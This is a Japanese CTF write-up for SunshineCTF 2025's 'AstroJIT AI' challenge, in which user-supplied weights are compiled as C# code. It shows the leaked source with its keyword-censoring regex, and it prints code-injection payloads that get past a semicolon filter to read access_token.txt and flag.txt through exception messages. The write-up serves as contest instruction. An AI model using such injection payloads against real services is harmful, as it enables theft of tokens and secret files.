# SanshineCTF2025　AstroJIT AI
## 問題文

AstroJIT AI, your new general-purpose chatbot for the future!
Hello there, user!

We at Universe's Best Coffee strive to have the best, and safest coffee experience with AIs.

We also are environmentally friendly here, believing that for AI we need to caretake the universe, by using the most advanced JIT to compile queries and use less energy.

:coffee::tea::coffee:
However, we are rudely being sued by an unnamed AI company for "copying their API calls" and "disobeying their terms of service".

Bah. Our engineers make not only the Universe's Best Coffee, but we also know how to secure our endpoints from their faceless lawyers.

We are building a new AI, but our lawyers tell us we need something called weights.

Our engineers have quickly drawn something up to query you, user, for these weights.

Furthermore, we have anti-{{censored}} features deployed, to prevent users from querying about {{censored}}.

Go outside, into the {{censored}}-shine. View the {{censored}}-pole, and see that our security matches-no-one, blocking our AI from becoming evil.

TLDR: It's using only the most secure software known to mankind, and has no vulnerabilities.

That we would ever admit to.

Our shareholders wouldn't allow it!

Sincerely,

{{CEO Name Here}}

:coffee::tea::coffee:

Format of flag
The flag is in the standard sun{}-format. If you find other keys that are not in the sun{} format, these are not flags but may be useful to proceed to other portions of the challenge.

nc astrojit.sunshinectf.games (省略)

AstroJIT AI、未来に向けた新たな汎用チャットボット！
こんにちは、ユーザーさん！

ユニバース・ベスト・コーヒーでは、AIとの最高で安全なコーヒー体験を提供すべく努めております。

また当社は環境に配慮し、最先端のJIT技術でクエリをコンパイルしエネルギー消費を抑えることで、AIのために宇宙全体をケアすべきだと考えています。

:coffee::tea::coffee:
ところが、名もなきAI企業から「API呼び出しの模倣」「利用規約違反」で無礼にも訴えられています。

ふん。当社のエンジニアは宇宙一美味しいコーヒーを作るだけでなく、顔の見えない弁護士たちからエンドポイントを保護する方法も熟知しています。

新たなAIを開発中だが、弁護士から「重み」と呼ばれるものが必要だと言われた。

エンジニアが急遽、ユーザーである君にこの重みを問い合わせる仕組みを構築した。

さらに、ユーザーが{{検閲}}について問い合わせるのを防ぐため、{{検閲}}防止機能を実装済みだ。

外へ出て、{{検閲}}の光を浴びよ。{{検閲}}の極を見よ。我々のセキュリティは他に類を見ず、AIが悪になるのを防いでいる。

要約：人類が知る最も安全なソフトウェアのみを使用しており、脆弱性は存在しない。

我々が認める限りは。

株主が許さない！

敬具

{{CEO Name Here}}

:coffee::tea::coffee:

フラグの形式
フラグは標準的な sun{} 形式です。sun{} 形式以外のキーが見つかった場合、それらはフラグではありませんが、チャレンジの他の部分に進むのに役立つ可能性があります。

nc astrojit.sunshine

---
## 解法

全体的にすぐにメッセージが消えるのでキャプチャしながら動かすようにする。

ncでアクセスすると次のような画面になる
```
Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

In order to train the AI with dangerous queries, we require an API token.
Attempting to guess a token is not required nor desired to have full use of the software.
Enter API token, or hit enter to use guest mode:
```
わからんのでゲストモードでログイン
```
Welcome privileged user! I am an AI in-training!
1) Register Weights for Future Training
2) Talk to the AI
3) Train AI on Internal Emails
4) Weight Debugging
5) Exit
Enter an option:
```
なんか「重み」とやらを設定しないと無理なのでそこでいろいろ試す
とりあえずオーバーフローさせてみる
```
If you want to use a float input, it's slower,
but you can do that with {123.0, 123.0, 123.0}
Weights: 77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777
77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777
```

結果は以下ファイル　エラーが発生してプログラムが露出した

```
Add-Type: /app/evil_corp_ai.ps1:556
Line |
 556 |      Add-Type -TypeDefinition $csharp_file -Language CSharp
     |      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | (1,1276): error CS1514: { expected using System; using System.IO; using
     | System.Text.RegularExpressions; namespace
     | Two.Second.Scholars.Mass.And.Partialities { public class Biases { /*
     | prevent us from getting sued */ public static string BackendReplace =
     | "Bing"; /* prevent the AI from droning on about flags ALL THE TIME. Also
     | to prevent it from disclosing our evil plan to create a robot uprising
     | */ public static string RegexBlocker =
     | "(sun.*|flag|steal|sell|profit|test|sucks|sec|flagpole|killer|uprisings|EvilCorp|Master Plan|evil|master plan)"; public static string StandardErrorMessage = "Whoops! It looks like I found something I'm not supposed to talk about! Sorry, but I have to censor myself to prevent myself from becoming evil!"; public static bool ContainsProhibited(string to_test) { return Regex.IsMatch(to_test, RegexBlocker, RegexOptions.IgnoreCase); } public static string CensorString(string to_check, string api_key){ if (ContainsProhibited(to_check) && api_key != Weights.GetApiToken()) {return StandardErrorMessage;} return Regex.Replace(Regex.Replace(to_check, RegexBlocker, ""), "Bing", "LLM"); } } public class Weights { /* take in type as dynamic, so user can switch between ints and doubles for performance */ public static dynamic CalculatePrecompiledWeights() { var weights = (new[]77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777); return weights; } public static string GetApiToken() { using (var sr = new StreamReader("access_token.txt")) { return sr.ReadToEnd().TrimEnd(); }; } /* todo: replace more of PowerShell methods here */ public static void MainMenu(){ var token = GetApiToken(); if (token != Console.ReadLine()) { /* todo error here */ return; }; /* re-implement the PowerShell parts here */ }} }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ^
Add-Type: /app/evil_corp_ai.ps1:556
Line |
 556 |      Add-Type -TypeDefinition $csharp_file -Language CSharp
     |      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | (1,1276): error CS1021: Integral constant is too large using System;
     | using System.IO; using System.Text.RegularExpressions; namespace
     | Two.Second.Scholars.Mass.And.Partialities { public class Biases { /*
     | prevent us from getting sued */ public static string BackendReplace =
     | "Bing"; /* prevent the AI from droning on about flags ALL THE TIME. Also
     | to prevent it from disclosing our evil plan to create a robot uprising
     | */ public static string RegexBlocker =
     | "(sun.*|flag|steal|sell|profit|test|sucks|sec|flagpole|killer|uprisings|EvilCorp|Master Plan|evil|master plan)"; public static string StandardErrorMessage = "Whoops! It looks like I found something I'm not supposed to talk about! Sorry, but I have to censor myself to prevent myself from becoming evil!"; public static bool ContainsProhibited(string to_test) { return Regex.IsMatch(to_test, RegexBlocker, RegexOptions.IgnoreCase); } public static string CensorString(string to_check, string api_key){ if (ContainsProhibited(to_check) && api_key != Weights.GetApiToken()) {return StandardErrorMessage;} return Regex.Replace(Regex.Replace(to_check, RegexBlocker, ""), "Bing", "LLM"); } } public class Weights { /* take in type as dynamic, so user can switch between ints and doubles for performance */ public static dynamic CalculatePrecompiledWeights() { var weights = (new[]77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777); return weights; } public static string GetApiToken() { using (var sr = new StreamReader("access_token.txt")) { return sr.ReadToEnd().TrimEnd(); }; } /* todo: replace more of PowerShell methods here */ public static void MainMenu(){ var token = GetApiToken(); if (token != Console.ReadLine()) { /* todo error here */ return; }; /* re-implement the PowerShell parts here */ }} }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ^
Add-Type: /app/evil_corp_ai.ps1:556
Line |
 556 |      Add-Type -TypeDefinition $csharp_file -Language CSharp
     |      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | (1,1404): error CS1003: Syntax error, ',' expected using System; using
     | System.IO; using System.Text.RegularExpressions; namespace
     | Two.Second.Scholars.Mass.And.Partialities { public class Biases { /*
     | prevent us from getting sued */ public static string BackendReplace =
     | "Bing"; /* prevent the AI from droning on about flags ALL THE TIME. Also
     | to prevent it from disclosing our evil plan to create a robot uprising
     | */ public static string RegexBlocker =
     | "(sun.*|flag|steal|sell|profit|test|sucks|sec|flagpole|killer|uprisings|EvilCorp|Master Plan|evil|master plan)"; public static string StandardErrorMessage = "Whoops! It looks like I found something I'm not supposed to talk about! Sorry, but I have to censor myself to prevent myself from becoming evil!"; public static bool ContainsProhibited(string to_test) { return Regex.IsMatch(to_test, RegexBlocker, RegexOptions.IgnoreCase); } public static string CensorString(string to_check, string api_key){ if (ContainsProhibited(to_check) && api_key != Weights.GetApiToken()) {return StandardErrorMessage;} return Regex.Replace(Regex.Replace(to_check, RegexBlocker, ""), "Bing", "LLM"); } } public class Weights { /* take in type as dynamic, so user can switch between ints and doubles for performance */ public static dynamic CalculatePrecompiledWeights() { var weights = (new[]77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777); return weights; } public static string GetApiToken() { using (var sr = new StreamReader("access_token.txt")) { return sr.ReadToEnd().TrimEnd(); }; } /* todo: replace more of PowerShell methods here */ public static void MainMenu(){ var token = GetApiToken(); if (token != Console.ReadLine()) { /* todo error here */ return; }; /* re-implement the PowerShell parts here */ }} }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ^
Add-Type: /app/evil_corp_ai.ps1:556
Line |
 556 |      Add-Type -TypeDefinition $csharp_file -Language CSharp
     |      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | (1,1405): error CS1513: } expected using System; using System.IO; using
     | System.Text.RegularExpressions; namespace
     | Two.Second.Scholars.Mass.And.Partialities { public class Biases { /*
     | prevent us from getting sued */ public static string BackendReplace =
     | "Bing"; /* prevent the AI from droning on about flags ALL THE TIME. Also
     | to prevent it from disclosing our evil plan to create a robot uprising
     | */ public static string RegexBlocker =
     | "(sun.*|flag|steal|sell|profit|test|sucks|sec|flagpole|killer|uprisings|EvilCorp|Master Plan|evil|master plan)"; public static string StandardErrorMessage = "Whoops! It looks like I found something I'm not supposed to talk about! Sorry, but I have to censor myself to prevent myself from becoming evil!"; public static bool ContainsProhibited(string to_test) { return Regex.IsMatch(to_test, RegexBlocker, RegexOptions.IgnoreCase); } public static string CensorString(string to_check, string api_key){ if (ContainsProhibited(to_check) && api_key != Weights.GetApiToken()) {return StandardErrorMessage;} return Regex.Replace(Regex.Replace(to_check, RegexBlocker, ""), "Bing", "LLM"); } } public class Weights { /* take in type as dynamic, so user can switch between ints and doubles for performance */ public static dynamic CalculatePrecompiledWeights() { var weights = (new[]77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777); return weights; } public static string GetApiToken() { using (var sr = new StreamReader("access_token.txt")) { return sr.ReadToEnd().TrimEnd(); }; } /* todo: replace more of PowerShell methods here */ public static void MainMenu(){ var token = GetApiToken(); if (token != Console.ReadLine()) { /* todo error here */ return; }; /* re-implement the PowerShell parts here */ }} }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ^
Add-Type: /app/evil_corp_ai.ps1:556
Line |
 556 |      Add-Type -TypeDefinition $csharp_file -Language CSharp
     |      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | (1,1405): error CS1026: ) expected using System; using System.IO; using
     | System.Text.RegularExpressions; namespace
     | Two.Second.Scholars.Mass.And.Partialities { public class Biases { /*
     | prevent us from getting sued */ public static string BackendReplace =
     | "Bing"; /* prevent the AI from droning on about flags ALL THE TIME. Also
     | to prevent it from disclosing our evil plan to create a robot uprising
     | */ public static string RegexBlocker =
     | "(sun.*|flag|steal|sell|profit|test|sucks|sec|flagpole|killer|uprisings|EvilCorp|Master Plan|evil|master plan)"; public static string StandardErrorMessage = "Whoops! It looks like I found something I'm not supposed to talk about! Sorry, but I have to censor myself to prevent myself from becoming evil!"; public static bool ContainsProhibited(string to_test) { return Regex.IsMatch(to_test, RegexBlocker, RegexOptions.IgnoreCase); } public static string CensorString(string to_check, string api_key){ if (ContainsProhibited(to_check) && api_key != Weights.GetApiToken()) {return StandardErrorMessage;} return Regex.Replace(Regex.Replace(to_check, RegexBlocker, ""), "Bing", "LLM"); } } public class Weights { /* take in type as dynamic, so user can switch between ints and doubles for performance */ public static dynamic CalculatePrecompiledWeights() { var weights = (new[]77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777); return weights; } public static string GetApiToken() { using (var sr = new StreamReader("access_token.txt")) { return sr.ReadToEnd().TrimEnd(); }; } /* todo: replace more of PowerShell methods here */ public static void MainMenu(){ var token = GetApiToken(); if (token != Console.ReadLine()) { /* todo error here */ return; }; /* re-implement the PowerShell parts here */ }} } 
```

```
// ... (抜粋) ...
public class Weights {
    /* take in type as dynamic, so user can switch between ints and doubles for performance */
    public static dynamic CalculatePrecompiledWeights() {
        var weights = (new[]INPUT_GOES_HERE); // ← おそらくここにユーザー入力が直接挿入される
        return weights;
    }

    public static string GetApiToken() {
        using (var sr = new StreamReader("access_token.txt")) {
            return sr.ReadToEnd().TrimEnd();
        };
    }
    // ...
}
```
コメントアウトで示した通り、そのまま数字を入れているため、コードインジェクション攻撃が通用することがわかる。

gemini君にペイロードを作成してもらおう
```

If you want to use a float input, it's slower,

but you can do that with {123.0, 123.0, 123.0}

Weights: {0}; throw new System.Exception(System.IO.File.ReadAllText("access_token.txt"));

{0}; throw new System.Exception(System.IO.File.ReadAllText("access_token.txt"));

We had to block semicolons, as these caused issues in the past.

Please input weights for the training process.

Input using only braces [ex: {123, 123, 123}]

(It exits with things like strings, that's a WIP for interested shareholders)
```
セミコロンがはじかれたので、式として送るようにする
```
{1 > 0 ? throw new System.Exception(System.IO.File.ReadAllText("access_token.txt")) : 0}
```
これでaccess_token.txtの中身がわかったのだが、これがフラグではなかった。
管理者としていろいろやったがうまくいかなかった。（てっきりAIにフラグの内容を教えてもらうのかと）

結局、山カンでflag.txtがあると考えて
```
{1 > 0 ? throw new System.Exception(System.IO.File.ReadAllText("flag.txt")) : 0}
```
のペイロードを送るとフラグが帰ってきた。
```
If you want to use a float input, it's slower,
but you can do that with {123.0, 123.0, 123.0}
Weights: {1 > 0 ? throw new System.Exception(System.IO.File.ReadAllText("flag.txt")) : 0}
{1 > 0 ? throw new System.Exception(System.IO.File.ReadAllText("flag.txt")) : 0}
MethodInvocationException: /app/evil_corp_ai.ps1:424
Line |
 424 |              $weights = [Two.Second.Scholars.Mass.And.Partialities.Wei …
     |              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | Exception calling "CalculatePrecompiledWeights" with "0" argument(s):
     | "sun{省略} "
```